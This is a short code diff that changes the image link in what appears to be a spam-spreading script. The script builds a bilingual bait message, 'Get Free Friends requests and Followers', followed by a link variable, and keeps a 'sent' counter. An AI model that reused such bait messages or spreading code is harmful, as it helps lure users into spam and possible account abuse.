@@ -162,7 +162,7 @@
         return Chaine;
     }
 
-    fotolink = "http://im33.gulfup.com/wQqxq.png";
+    fotolink = "http://media.smashingmagazine.com/wp-content/uploads/images/iphone-app-design-trends/facebook.png";
     text = " أحصل على الكثير من الأصدقاء والمتابعين من هنا -> Get Free Friends requests and Followers -> Enter here -> " + lien;
     gonderildi = 0;
 
